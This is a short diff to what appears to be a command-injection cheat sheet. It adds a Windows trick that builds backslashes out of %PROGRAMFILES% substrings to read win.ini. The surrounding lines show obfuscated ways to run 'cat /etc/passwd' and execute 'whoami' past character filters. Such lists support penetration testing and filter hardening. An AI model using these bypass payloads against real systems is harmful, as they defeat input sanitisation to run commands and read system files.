@@ -58,6 +58,9 @@ All of these execute 'cat /etc/passwd'.
 `cat ${PWD:0:1}etc${PWD:0:1}passwd`  
 `cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd`   
 
+Windows-only backslash bypass  
+`type C:%PROGRAMFILES:~2,-13%Windows%PROGRAMFILES:~2,-13%win.ini`
+
 ### Misc execution tricks
 Through '$0' sequence.  
 `echo whoami|$0`  
